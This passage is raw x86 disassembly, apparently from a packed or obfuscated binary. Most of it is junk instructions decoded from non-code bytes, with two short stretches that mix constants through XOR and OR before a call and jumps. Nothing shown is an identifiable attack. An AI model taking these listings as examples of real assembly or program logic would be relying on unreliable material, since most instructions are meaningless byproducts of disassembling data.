  419af1:	fdivr  QWORD PTR [eax]
  419af3:	aaa    
  419af4:	jle    0x419b3e
  419af6:	ret    0x4e74
  419af9:	ret    
  419afa:	add    al,0x96
  419afc:	jns    0x419a7f
  419afe:	pusha  
  419aff:	neg    DWORD PTR [ebx-0x65]
  419b02:	mov    WORD PTR [ebx+0x222566e5],ss
  419b08:	inc    ecx
  419b09:	inc    esp
  419b0a:	push   0xffffffff
  419b0c:	cdq    
  419b0d:	test   al,0xce
  419b0f:	cbw    
  419b11:	sbb    bl,BYTE PTR [ebp+0x3f133de8]
  419b17:	rcl    DWORD PTR [esi],1
  419b19:	repnz and eax,0xe03aa1af
  419b1f:	add    eax,0x175d0d9b
  419b24:	ret    0x20ff
  419b27:	mov    al,ds:0x399172ba
  419b2c:	or     eax,0x6c3d4465
  419b31:	sti    
  419b32:	out    dx,eax
  419b33:	add    ecx,DWORD PTR [esi]
  419b35:	inc    ebx
  419b36:	inc    edx
  419b37:	dec    ebx
  419b38:	pop    edi
  419b39:	js     0x419baa
  419b3b:	xchg   ebx,eax
  419b3c:	mov    ecx,0x1777803d
  419b41:	ret    0xb7e9
  419b44:	loop   0x419b31
  419b46:	xor    eax,0xb2c41cbd
  419b4b:	xor    al,al
  419b4d:	lods   eax,DWORD PTR ds:[si]
  419b4f:	into   
  419b50:	lock jg 0x419b02
  419b53:	out    0x1e,al
  419b55:	lahf   
  419b56:	lahf   
  419b57:	sbb    eax,0x984a04c1
  419b5c:	ins    BYTE PTR es:[edi],dx
  419b5d:	outs   dx,BYTE PTR ds:[esi]
  419b5e:	mov    eax,ebp
  419b60:	dec    edi
  419b61:	loope  0x419aee
  419b63:	jae    0x419af3
  419b65:	int    0xa0
  419b67:	stos   DWORD PTR es:[edi],eax
  419b68:	fidiv  DWORD PTR [ebx]
  419b6a:	pop    esp
  419b6b:	js     0x419bd8
  419b6d:	std    
  419b6e:	dec    esp
  419b6f:	sbb    dl,BYTE PTR [edx-0x4670dcde]
  419b75:	mov    ds:0x458ee7ea,al
  419b7a:	sub    edi,ebp
  419b7c:	sbb    DWORD PTR [ecx+0x71],esi
  419b7f:	pop    ds
  419b80:	fwait
  419b81:	leave  
  419b82:	jb     0x419b71
  419b84:	jne    0x419bfb
  419b86:	(bad)  
  419b87:	fsub   QWORD PTR [edi-0x40]
  419b8a:	in     eax,0xac
  419b8c:	fidiv  DWORD PTR [ebp-0x80]
  419b8f:	mov    bh,0x25
  419b91:	outs   dx,BYTE PTR ds:[esi]
  419b92:	push   ebp
  419b94:	pop    es
  419b95:	xchg   DWORD PTR [ecx+0x7e3a532f],esp
  419b9b:	cmp    eax,0x332a7dc2
  419ba0:	stc    
  419ba1:	inc    ecx
  419ba2:	sub    ebx,DWORD PTR [esi]
  419ba4:	repnz dec edi
  419ba6:	aad    0xec
  419ba8:	sub    al,dl
  419baa:	shr    DWORD PTR [ebx+0x9],cl
  419bad:	inc    edi
  419bae:	icebp  
  419baf:	scas   eax,DWORD PTR es:[edi]
  419bb0:	push   ebp
  419bb1:	cmp    eax,0x164bc55c
  419bb6:	into   
  419bb7:	pusha  
  419bb8:	mov    ah,BYTE PTR [edi+0x65d5f2c8]
  419bbe:	ds push esi
  419bc0:	xor    esp,edi
  419bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bc3:	outs   dx,BYTE PTR ds:[esi]
  419bc4:	and    al,0xef
  419bc6:	leave  
  419bc7:	fist   WORD PTR ds:0x4fd779c1
  419bcd:	into   
  419bce:	in     al,0xc4
  419bd0:	cmp    eax,0xa4c86bab
  419bd5:	dec    ebp
  419bd6:	mov    eax,edi
  419bd8:	(bad)  
  419bd9:	call   0x57c8:0xd145de23
  419be0:	ret    0x9462
  419be3:	push   ebx
  419be4:	inc    esi
  419be5:	add    BYTE PTR [esi+0x7fca95ec],0x5e
  419bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bed:	lock dec ebx
  419bef:	mov    al,ds:0x52f95c53
  419bf4:	or     BYTE PTR [edi+0x64e5b298],0x23
  419bfb:	sbb    ecx,DWORD PTR [edi+0x14]
  419bfe:	cmp    ebp,DWORD PTR [edx+ebx*2]
  419c01:	cmp    al,0x22
  419c03:	test   dl,0x44
  419c06:	mov    ebp,0xe14c1461
  419c0b:	jbe    0x419be3
  419c0d:	push   ecx
  419c0e:	pop    esi
  419c0f:	sti    
  419c10:	or     al,0x1b
  419c12:	fcomp  QWORD PTR [ebp+0x1a375bb4]
  419c18:	addr16 jne 0x419c78
  419c1b:	mov    ds:0x4ab5e706,al
  419c20:	fsubr  DWORD PTR [eax-0x52]
  419c23:	xchg   esp,eax
  419c24:	pop    ebx
  419c25:	inc    eax
  419c26:	fist   DWORD PTR [eax+eiz*1]
  419c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c2a:	mov    ebx,0x770779b3
  419c2f:	enter  0x8872,0xcb
  419c33:	push   0x15
  419c35:	xchg   ecx,eax
  419c36:	and    BYTE PTR [edi-0x59],dl
  419c39:	neg    eax
  419c3b:	adc    al,0xc2
  419c3d:	pop    ebp
  419c3e:	xor    bl,BYTE PTR [edx+0x29]
  419c41:	push   eax
  419c42:	jp     0x419c54
  419c44:	ficom  DWORD PTR [ecx]
  419c46:	xchg   edx,eax
  419c47:	ja     0x419bca
  419c49:	adc    BYTE PTR [ecx+ebx*8],dl
  419c4c:	fidiv  DWORD PTR [edx+0x13056632]
  419c52:	mov    DWORD PTR [edi],ebx
  419c54:	jle    0x419c5c
  419c56:	lds    ecx,FWORD PTR [ecx-0x50]
  419c59:	jb     0x419be6
  419c5b:	sub    BYTE PTR [esi+0x45],dh
  419c5e:	dec    esi
  419c5f:	ret    
  419c60:	call   0xfc08:0xec502131
  419c67:	pop    ss
  419c68:	or     ebp,DWORD PTR [ecx+0x75]
  419c6b:	jmp    0x419cd6
  419c6d:	fxch   st(3)
  419c6f:	pusha  
  419c70:	inc    ebp
  419c71:	mov    ebx,0xd1137cf5
  419c76:	mov    BYTE PTR [esi+0x6c3cfce8],cl
  419c7c:	fild   QWORD PTR [edx-0x715fd77d]
  419c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c83:	and    cl,dh
  419c85:	add    DWORD PTR [ecx],esi
  419c87:	jns    0x419c51
  419c89:	sub    BYTE PTR [esi],bl
  419c8b:	push   ds
  419c8c:	adc    eax,0x30f830bf
  419c91:	cmc    
  419c92:	inc    ebp
  419c93:	outs   dx,BYTE PTR ds:[esi]
  419c94:	sub    BYTE PTR [edi-0x53a04f94],cl
  419c9a:	and    BYTE PTR [ecx-0x576668ca],0x3a
  419ca1:	mov    sp,ss
  419ca4:	jns    0x419d19
  419ca6:	fwait
  419ca7:	push   esp
  419ca8:	jnp    0x419d0d
  419caa:	fcom   DWORD PTR cs:0x4140d59d
  419cb1:	hlt    
  419cb2:	add    esi,DWORD PTR [edx+0x38]
  419cb5:	push   ds
  419cb6:	retf   0xca06
  419cb9:	fsin   
  419cbb:	xor    cl,cl
  419cbd:	rcr    BYTE PTR [edx],0x35
  419cc0:	repz daa 
  419cc2:	add    al,0x72
  419cc4:	ror    DWORD PTR [ebp+0x50a0a218],1
  419cca:	inc    edi
  419ccb:	sbb    al,0xf3
  419ccd:	mul    al
  419ccf:	lds    ebp,FWORD PTR [ecx]
  419cd1:	inc    eax
  419cd2:	push   esp
  419cd3:	iret   
  419cd4:	cmp    cl,0xf8
  419cd7:	ins    DWORD PTR es:[edi],dx
  419cd8:	xchg   DWORD PTR [esi-0x1a],edi
  419cdb:	fdivrp st(7),st
  419cdd:	outs   dx,DWORD PTR ds:[esi]
  419cde:	pop    ecx
  419cdf:	adc    eax,0xffffffc4
  419ce2:	ret    0x37ae
  419ce5:	test   al,0xaf
  419ce7:	push   cs
  419ce8:	fsubr  QWORD PTR [esp+ebp*1-0x945d301]
  419cef:	fdiv   QWORD PTR [edx]
  419cf1:	aam    0xb9
  419cf3:	sub    BYTE PTR [edx+0x6c911325],0x99
  419cfa:	sbb    DWORD PTR [ebp-0x6873146],esp
  419d00:	mov    BYTE PTR [eax],ah
  419d02:	arpl   WORD PTR [esi+0x6b95a815],ax
  419d08:	mov    ecx,0x2cd28672
  419d0d:	fstp   QWORD PTR [ecx+0x15]
  419d10:	pushf  
  419d11:	inc    eax
  419d12:	jmp    0x419d4a
  419d14:	hlt    
  419d15:	mov    edx,DWORD PTR [eax-0x27f00a3a]
  419d1b:	jb     0x72c2ddbf
  419d21:	sbb    al,0x22
  419d23:	ins    DWORD PTR es:[edi],dx
  419d24:	nop
  419d25:	cs sar edi,1
  419d28:	adc    BYTE PTR [ebp+0x2b69d386],dh
  419d2e:	cli    
  419d2f:	in     eax,0xe8
  419d31:	in     eax,0x1c
  419d33:	clc    
  419d34:	cmp    DWORD PTR [ecx],ebx
  419d36:	inc    eax
  419d37:	or     dl,dh
  419d39:	adc    eax,0x4b64db6a
  419d3e:	mov    eax,0xe087e183
  419d43:	cwde   
  419d44:	clc    
  419d45:	in     al,0xdb
  419d47:	mov    ch,0x3f
  419d49:	loope  0x419d8f
  419d4b:	sbb    al,0x25
  419d4d:	scas   al,BYTE PTR es:[edi]
  419d4e:	mov    WORD PTR [eax-0x50],?
  419d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d52:	push   eax
  419d53:	popf   
  419d54:	iret   
  419d55:	inc    edx
  419d56:	inc    esp
  419d57:	(bad)  
  419d58:	push   cs
  419d59:	xor    ebp,esp
  419d5b:	sub    eax,DWORD PTR [edi-0x7d1823d1]
  419d61:	xchg   esp,eax
  419d62:	or     edx,DWORD PTR [edi+0x56ec4a9a]
  419d68:	sbb    edi,eax
  419d6a:	add    cl,BYTE PTR ds:0xc7dd372e
  419d70:	xlat   BYTE PTR ds:[ebx]
  419d71:	jbe    0x419dbe
  419d73:	fldenv [eax+0x5a37c4]
  419d79:	jbe    0x419df3
  419d7b:	ror    ebx,1
  419d7d:	add    ebx,ecx
  419d7f:	mov    esp,0x6e382383
  419d84:	nop
  419d85:	test   cl,ch
  419d87:	jg     0x419d09
  419d89:	aas    
  419d8a:	xchg   edi,eax
  419d8b:	jmp    FWORD PTR [eax+0x2c29cecb]
  419d91:	mov    edi,0xfd7dfcef
  419d96:	sub    DWORD PTR [esi],ebx
  419d98:	push   ebp
  419d99:	add    eax,0xe08eb1ff
  419d9e:	inc    esi
  419d9f:	jl     0x419d4d
  419da1:	push   cs
  419da2:	sub    al,0x2f
  419da4:	adc    eax,0x9aae54b6
  419da9:	mov    edx,0x979bd458
  419dae:	mov    eax,ds:0x8678cd3
  419db3:	test   eax,0xa28e78ec
  419db8:	and    esi,edi
  419dba:	add    al,0xed
  419dbc:	(bad)  
  419dbd:	sbb    al,0xbe
  419dbf:	jle    0x419de4
  419dc1:	sbb    BYTE PTR fs:[esi],al
  419dc4:	mov    ss,WORD PTR [ecx-0x68]
  419dc7:	jb     0x419de2
  419dc9:	jne    0x419dcd
  419dcb:	std    
  419dcc:	pusha  
  419dcd:	mov    bh,0xde
  419dcf:	pop    ebp
  419dd0:	sbb    BYTE PTR [ebp+0x49],ch
  419dd3:	cmp    BYTE PTR [ebx+0x2f55bec6],dh
  419dd9:	inc    ecx
  419dda:	popa   
  419ddb:	push   ss
  419ddc:	mov    ch,0x19
  419dde:	sahf   
  419ddf:	mov    BYTE PTR [ebx+edi*1],bl
  419de2:	jmp    0xcdc3:0xb12069d
  419de9:	popa   
  419dea:	popa   
  419deb:	(bad)
  419def:	or     bh,al
  419df1:	out    dx,eax
  419df2:	in     eax,0xf
  419df4:	and    BYTE PTR [edi+0xcf3663a],cl
  419dfa:	or     esi,DWORD PTR [ecx+0x22eca820]
  419e00:	inc    edi
  419e01:	push   esi
  419e02:	xor    dh,ah
  419e04:	cmc    
  419e05:	shl    esi,1
  419e07:	mov    esp,esi
  419e09:	fldenv ds:0xd492a297
  419e0f:	int    0xad
  419e11:	js     0x419e06
  419e13:	test   al,0x43
  419e15:	popf   
  419e16:	push   esp
  419e17:	dec    edi
  419e18:	loopne 0x419de4
  419e1a:	push   ebx
  419e1b:	shl    DWORD PTR [ebp+0x44],cl
  419e1e:	jge    0x419e51
  419e20:	jne    0x419e7f
  419e22:	in     eax,dx
  419e23:	cmp    al,0xdf
  419e25:	xchg   BYTE PTR [eax-0x20],cl
  419e28:	pusha  
  419e29:	mov    dh,0xfc
  419e2b:	data16 and ah,BYTE PTR [ebx]
  419e2e:	jb     0x419e8e
  419e30:	or     ecx,DWORD PTR [esi]
  419e32:	mov    dh,0xb
  419e34:	push   0xffffffa9
  419e36:	mov    ecx,DWORD PTR [esp+0x14]
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x6a49b09b
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	ja     0x419eed
  419e70:	shl    BYTE PTR [esi],1
  419e72:	(bad)
  419e75:	mov    ds:0x1b93e37,al
  419e7a:	iret   
  419e7b:	adc    eax,0x6555363e
  419e80:	inc    esi
  419e81:	mov    ebp,0x3a4edebd
  419e86:	xchg   ebp,eax
  419e87:	stos   BYTE PTR es:[edi],al
  419e88:	xlat   BYTE PTR ds:[ebx]
  419e89:	jp     0x419e52
  419e8b:	push   esi
  419e8c:	push   edi
  419e8d:	data16 jne 0x419e83
  419e90:	(bad)  
  419e91:	ret    0x2efc
  419e94:	out    dx,al
  419e95:	add    ah,BYTE PTR [eax+ecx*4]
  419e98:	fdivrp st(7),st
  419e9a:	mov    al,0xc9
  419e9c:	sub    BYTE PTR [edx-0x9],al
  419e9f:	or     edx,esp
  419ea1:	sub    al,0x4c
  419ea3:	sbb    DWORD PTR [edx],edi
  419ea5:	mov    esi,DWORD PTR [ebp-0x18]
  419ea8:	mov    ch,0xd4
  419eaa:	ret    
  419eab:	ins    DWORD PTR es:[edi],dx
  419eac:	pop    ds
  419ead:	shl    BYTE PTR [eax+0x68],1
  419eb0:	xchg   DWORD PTR [esi-0x1e],edi
  419eb3:	add    ebx,DWORD PTR [edi]
  419eb5:	push   esp
  419eb6:	xchg   edx,eax
  419eb7:	(bad)  
  419eb9:	sub    dh,cl
  419ebb:	daa    
  419ebc:	cli    
  419ebd:	outs   dx,BYTE PTR ds:[esi]
  419ebe:	sbb    ch,BYTE PTR [esi+0x3d]
  419ec1:	mov    cl,0x6e
  419ec3:	int3   
  419ec4:	jno    0x419ecc
  419ec6:	div    DWORD PTR ds:0x19ff6492
  419ecc:	enter  0x42ac,0x7d
  419ed0:	mov    al,ds:0x2978bf7d
  419ed5:	test   dh,al
  419ed7:	lods   eax,DWORD PTR ds:[esi]
  419ed8:	imul   ebp,edi,0xffffff9e
  419edb:	jle    0x419e9b
  419edd:	es imul eax,ecx,0x5cb80f40
  419ee4:	inc    ebp
  419ee5:	imul   eax,DWORD PTR [edx],0x35
  419ee8:	aas    
  419ee9:	or     BYTE PTR [esi],dh
  419eeb:	scas   eax,DWORD PTR es:[edi]
  419eec:	xor    dh,BYTE PTR [ebx+0x6b697cf2]
  419ef2:	rol    al,1
  419ef4:	adc    ecx,DWORD PTR [ecx-0x69]
  419ef7:	push   esp
  419ef8:	out    0x80,eax
  419efa:	add    esi,esi
  419efc:	pop    ecx
  419efd:	xor    DWORD PTR [eax+0x7],edx
  419f00:	je     0x419e89
  419f02:	fcomp  st(4)
  419f04:	repz dec edx
  419f06:	lahf   
  419f07:	fcmovu st,st(0)
  419f09:	and    BYTE PTR [eax+0x5ee5ba63],al
  419f0f:	jno    0x419e94
  419f11:	enter  0xd3d3,0x52
  419f15:	push   cs
  419f16:	mov    ds,WORD PTR [eax-0x705bf7cb]
  419f1c:	mov    DWORD PTR [eax-0x53],esp
  419f1f:	jmp    0x4553:0xcb83e32
  419f26:	lock fwait
  419f28:	popf   
  419f29:	push   ss
  419f2a:	(bad)  
  419f2b:	jge    0x419ec4
  419f2d:	addr16 jp 0x419f60
  419f30:	icebp  
  419f31:	je     0x419f46
  419f33:	imul   ebx,ebx,0x10
  419f36:	inc    ebp
  419f37:	in     al,dx
  419f38:	and    al,BYTE PTR [esi-0x6ebf0140]
  419f3e:	pop    edi
  419f3f:	test   esi,0xee799bd
  419f45:	rcr    dl,0xe8
  419f48:	test   DWORD PTR ds:0x7b4faeb4,ecx
  419f4e:	out    0x8c,al
  419f50:	fist   WORD PTR [edx+0x401d9581]
  419f56:	cmp    al,0x1
  419f58:	cdq    
  419f59:	mov    eax,ds:0xb40ed0e1
  419f5e:	daa    
  419f5f:	enter  0x4444,0x16
  419f63:	xor    BYTE PTR [ebx+0x64d382fd],bl
  419f69:	cmp    al,0xa
  419f6b:	sbb    al,BYTE PTR [esi+ecx*8]
  419f6e:	pop    edi
  419f6f:	imul   eax,esi,0x77786cbe
  419f75:	cmp    eax,0x86b55b0b
  419f7a:	inc    ebp
  419f7b:	jno    0x419f9c
  419f7d:	cli    
  419f7e:	jle    0x419fd8
  419f80:	test   BYTE PTR [ebp-0x190544fa],bh
  419f86:	shl    ah,1
  419f88:	jmp    0xf2bad64e
  419f8d:	mov    dh,0xa5
  419f8f:	fild   QWORD PTR [eax-0x2c]
  419f92:	jbe    0x419fba
  419f94:	lods   eax,DWORD PTR ds:[esi]
  419f95:	retf   0x3692
  419f98:	enter  0xf076,0xe0
  419f9c:	in     al,0x37
  419f9e:	push   eax
  419f9f:	das    
  419fa0:	stos   BYTE PTR es:[edi],al
  419fa1:	jmp    0xbd39:0x58f2ec7c
  419fa8:	adc    edi,DWORD PTR [ebx]
  419faa:	rcl    BYTE PTR [ecx+0x13],0xd6
  419fae:	dec    edx
  419faf:	xchg   esp,eax
  419fb0:	or     bl,ch
  419fb2:	mov    dl,0x15
  419fb4:	fldpi  
  419fb6:	sbb    al,0x92
  419fb8:	shl    DWORD PTR [esi+0x753a94c9],0xfa
  419fbf:	xchg   esi,eax
  419fc0:	ret    0xdd0b
  419fc3:	sub    BYTE PTR [edi-0x11ccae6c],bl
  419fc9:	loope  0x419f96
  419fcb:	aaa    
  419fcc:	or     dh,BYTE PTR [ebx-0x708722d7]
  419fd2:	mov    BYTE PTR [esi+edx*4-0x6a],al
  419fd6:	adc    eax,ecx
  419fd8:	pusha  
  419fd9:	std    
  419fda:	push   ebx
  419fdb:	sti    
  419fdc:	out    0x32,eax
  419fde:	mov    cl,0xc1
  419fe0:	or     DWORD PTR [eax],eax
  419fe2:	lods   eax,DWORD PTR ds:[esi]
  419fe3:	pop    edx
  419fe4:	shl    BYTE PTR [esi+0x38],0xe9
  419fe8:	inc    esi
  419fe9:	ds pop ebp
  419feb:	aad    0x96
  419fed:	mov    al,ds:0x71a49ddb
  419ff2:	clc    
  419ff3:	cmp    al,0x8e
  419ff5:	cmp    ebx,edx
  419ff7:	and    BYTE PTR [edx+edx*8-0x6],bh
  419ffb:	repnz dec edx
  419ffd:	fidivr WORD PTR [esi]
  419fff:	(bad)  [ebx-0x13]
  41a002:	cmp    eax,0x7051ec89
  41a007:	mov    DWORD PTR [ecx],ecx
  41a009:	mov    al,0x62
  41a00b:	mov    ch,0xa5
  41a00d:	mov    WORD PTR [edx-0x21],?
  41a010:	sbb    eax,0x72134305
  41a015:	mov    ds:0xaf5bbc72,eax
  41a01a:	jmp    0x41a02c
  41a01c:	xlat   BYTE PTR ds:[ebx]
  41a01d:	test   DWORD PTR [edi+0x65b4eb25],0xca7ce69a
  41a027:	daa    
  41a028:	pop    eax
  41a029:	or     edx,DWORD PTR [edx]
  41a02b:	inc    ecx
  41a02c:	pop    ds
  41a02d:	popf   
  41a02e:	jecxz  0x41a048
  41a030:	adc    al,BYTE PTR [esi+0x54e6e68b]
  41a036:	ss (bad) 
  41a038:	in     al,0x49
  41a03a:	out    dx,al
  41a03b:	stos   DWORD PTR es:[edi],eax
  41a03c:	and    al,0x50
  41a03e:	jp     0x41a05f
  41a040:	or     eax,0xb1c8e9ad
  41a045:	jbe    0x41a069
  41a047:	test   BYTE PTR [ebx],dl
  41a049:	in     eax,0x7e
  41a04b:	bound  edx,QWORD PTR ds:0x108158bb
  41a051:	std    
  41a052:	inc    esi
  41a053:	mov    ecx,ecx
  41a055:	lods   al,BYTE PTR ds:[esi]
  41a056:	(bad)  
  41a057:	lds    esi,FWORD PTR [edi-0x4f1c86ef]
  41a05d:	push   edi
  41a05e:	jle    0x41a007
  41a060:	mov    DWORD PTR [esi],esi
  41a062:	pop    ecx
  41a063:	rol    BYTE PTR [eax+0x24],0x8
  41a067:	or     BYTE PTR [esi],bh
  41a069:	data16 aam 0x48
  41a06c:	pop    eax
  41a06d:	(bad)  
  41a06f:	or     DWORD PTR [edx],esp
  41a071:	sub    ecx,ebp
  41a073:	pop    es
  41a074:	sub    eax,0x9cf77021
  41a079:	and    ecx,DWORD PTR [edi-0x5f]
  41a07c:	xchg   ecx,eax
  41a07d:	mov    edi,0x9c9e85b0
  41a082:	sbb    DWORD PTR [ebp+0x4a],ecx
  41a085:	pop    ss
  41a086:	cmp    cl,cl
  41a088:	and    eax,0x811495f0
  41a08d:	add    ebp,DWORD PTR [ecx]
  41a08f:	pop    ebp
  41a090:	das    
  41a091:	dec    esi
  41a092:	inc    esp
  41a093:	jecxz  0x41a053
  41a095:	push   eax
  41a096:	imul   ebx,DWORD PTR [edx-0x48f0b3f4],0xffffffad
  41a09d:	fwait
  41a09e:	xchg   edx,eax
  41a09f:	popf   
  41a0a0:	inc    edi
  41a0a1:	or     ebx,DWORD PTR [ebx+ebp*8+0x60]
  41a0a5:	dec    ebx
  41a0a6:	cmp    BYTE PTR [edi+0x39],cl
  41a0a9:	mov    ecx,0x9849d0e2
  41a0ae:	repz jae 0x41a097
  41a0b1:	cmc    
  41a0b2:	aad    0xeb
  41a0b4:	enter  0x9cb9,0x45
  41a0b8:	idiv   DWORD PTR [ebx]
  41a0ba:	les    edx,FWORD PTR [ebx-0x949604a]
  41a0c0:	push   0xffffffe2
  41a0c2:	fs pop es
  41a0c4:	lahf   
  41a0c5:	pop    edx
  41a0c6:	scas   al,BYTE PTR es:[edi]
  41a0c7:	xlat   BYTE PTR ds:[ebx]
  41a0c8:	or     bh,dl
  41a0ca:	popf   
  41a0cb:	inc    esi
  41a0cc:	mov    ebx,0x655370ae
  41a0d1:	gs inc edi
  41a0d3:	jmp    DWORD PTR [ecx]
  41a0d5:	pop    edi
  41a0d6:	mov    al,ds:0x87ddd024
  41a0db:	jge    0x41a0ee
  41a0dd:	lahf   
  41a0de:	and    eax,0xe2cd4840
  41a0e3:	xchg   edi,eax
  41a0e4:	push   ss
  41a0e5:	aas    
  41a0e6:	shr    DWORD PTR [edx+0x29],cl
  41a0e9:	ins    DWORD PTR es:[edi],dx
  41a0ea:	rol    ch,0x76
  41a0ed:	mov    edx,0xce27b09d
  41a0f2:	jae    0x41a0e1
  41a0f4:	mov    ds:0x8adaede5,eax
  41a0f9:	cmc    
  41a0fa:	out    0xa1,eax
  41a0fc:	(bad)  [ebx-0x3]
  41a0ff:	fs js  0x41a11e
  41a102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a103:	mov    ch,0xe2
  41a105:	add    cl,ah
  41a107:	test   DWORD PTR [eax],eax
  41a109:	pop    ebx
  41a10a:	xchg   edi,eax
  41a10b:	outs   dx,BYTE PTR ds:[esi]
  41a10c:	iret   
  41a10d:	test   DWORD PTR [eax+0x42],esp
  41a110:	adc    edi,ebp
  41a112:	ret    
  41a113:	clc    
  41a114:	jo     0x41a151
  41a116:	stc    
  41a117:	cdq    
  41a118:	mov    ds:0x246da7ff,al
  41a11d:	clc    
  41a11e:	call   0x61139ea6
  41a123:	dec    ebp
  41a124:	fcom   QWORD PTR [ebp-0x21]
  41a127:	add    ecx,esp
  41a129:	sbb    edi,DWORD PTR [edx-0x38]
  41a12c:	dec    ebp
  41a12d:	sub    eax,0x4cca13c
  41a132:	pop    ebp
  41a133:	lea    ecx,[ebp-0x66]
  41a136:	es sub edx,edx
  41a139:	pop    edx
  41a13a:	aam    0x65
  41a13c:	pop    ds
  41a13d:	sub    BYTE PTR [edx+0x69],0xf8
  41a141:	jb     0x41a181
  41a143:	push   cs
  41a144:	cmc    
  41a145:	mov    fs,edx
  41a147:	fist   DWORD PTR [esi-0x7f]
  41a14a:	rcl    BYTE PTR [ebx],1
  41a14c:	call   0x2763:0x3abf1644
  41a153:	sub    ebp,DWORD PTR [ebx-0x15]
  41a156:	dec    ebx
  41a157:	mov    ch,0x6
  41a159:	adc    DWORD PTR [eax],edx
  41a15b:	pop    esi
  41a15c:	inc    ebx
  41a15d:	or     ch,dh
  41a15f:	iret   
  41a160:	push   ss
  41a161:	js     0x41a0eb
  41a163:	or     BYTE PTR [ebx],bh
  41a165:	fwait
  41a166:	lods   eax,DWORD PTR ds:[esi]
  41a167:	cmp    eax,0x5e4fc634
  41a16c:	push   eax
  41a16d:	jl     0x41a10f
  41a16f:	iret   
  41a170:	arpl   bp,bx
  41a172:	mov    ?,WORD PTR [edi+0x71]
  41a175:	sub    cl,0xd
  41a178:	xchg   esp,eax
  41a179:	dec    al
  41a17b:	push   esi
  41a17c:	(bad)  
  41a17d:	dec    edi
  41a17e:	mov    edi,0xb5e6aabf
  41a183:	cli    
  41a184:	mov    ebx,0x365f5e6
  41a189:	mov    cl,0xe7
  41a18b:	mov    bh,0x6b
  41a18d:	out    0xd2,al
  41a18f:	and    ecx,DWORD PTR [edx+0x10]
  41a192:	fnsave [ecx+eiz*4-0x7f]
  41a196:	adc    eax,0xc992f69f
  41a19b:	popf   
  41a19c:	xor    esp,0xffffffee
  41a19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1a0:	aaa    
  41a1a1:	inc    edi
  41a1a2:	add    eax,DWORD PTR [edi+0x3d]
  41a1a5:	adc    eax,0x3d3a6d7
  41a1aa:	sbb    edi,DWORD PTR [edx+0x1eab1894]
  41a1b0:	adc    esi,DWORD PTR [edx]
  41a1b2:	retf   
  41a1b3:	push   esi
  41a1b4:	and    BYTE PTR [ecx-0x5be37c24],al
  41a1ba:	adc    bh,BYTE PTR [ecx]
  41a1bc:	cdq    
  41a1bd:	jmp    0x41a141
  41a1bf:	xchg   BYTE PTR [eax-0x6dc071ac],cl
  41a1c5:	or     esi,ecx
  41a1c7:	push   ebx
  41a1c8:	sti    
  41a1c9:	sbb    DWORD PTR [ebx],ecx
  41a1cb:	mov    dl,0xdb
  41a1cd:	and    eax,0x81d7a29b
  41a1d2:	mov    ds:0xa264e5f4,eax
  41a1d7:	pop    ecx
  41a1d8:	or     al,0x85
  41a1da:	xor    al,0x5c
  41a1dc:	and    ah,BYTE PTR ds:0xf273629e
  41a1e2:	pop    ss
  41a1e3:	lea    eax,[edi-0x2a]
  41a1e6:	sub    bl,bl
  41a1e8:	lea    esi,[esi+eax*2-0x7a]
  41a1ec:	(bad)  [ebx+esi*8+0x12a88cb9]
  41a1f3:	or     ebx,edx
  41a1f5:	sub    al,0x36
  41a1f7:	pop    edi
  41a1f8:	ror    DWORD PTR [edx+0x5],0x3d
  41a1fc:	test   DWORD PTR [eax],esi
  41a1fe:	mov    gs:0xb5fd2b5d,al
  41a204:	in     al,dx
  41a205:	test   DWORD PTR [edx+0x56afc92a],esi
  41a20b:	adc    dl,bh
  41a20d:	(bad)  [esi-0x7ec722fd]
  41a213:	imul   esi,DWORD PTR [edx+0x6],0xffffffdb
  41a217:	cpuid  
  41a219:	mov    BYTE PTR [ebx+0x50],ch
  41a21c:	dec    esi
  41a21d:	jp     0x41a1e3
  41a21f:	test   BYTE PTR ds:0x325d,ah
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2a1:	loop   0x41a28a
  41a2a3:	stos   BYTE PTR es:[edi],al
  41a2a4:	sub    ebp,DWORD PTR [ebp+0x12bc1816]
  41a2aa:	sbb    BYTE PTR [eax],bl
  41a2ac:	xchg   ecx,eax
  41a2ad:	cmp    BYTE PTR [ecx+0x29],bl
  41a2b0:	and    BYTE PTR [esi-0x4b],dl
  41a2b3:	lea    ecx,[ebp-0x67]
  41a2b6:	retf   0xb907
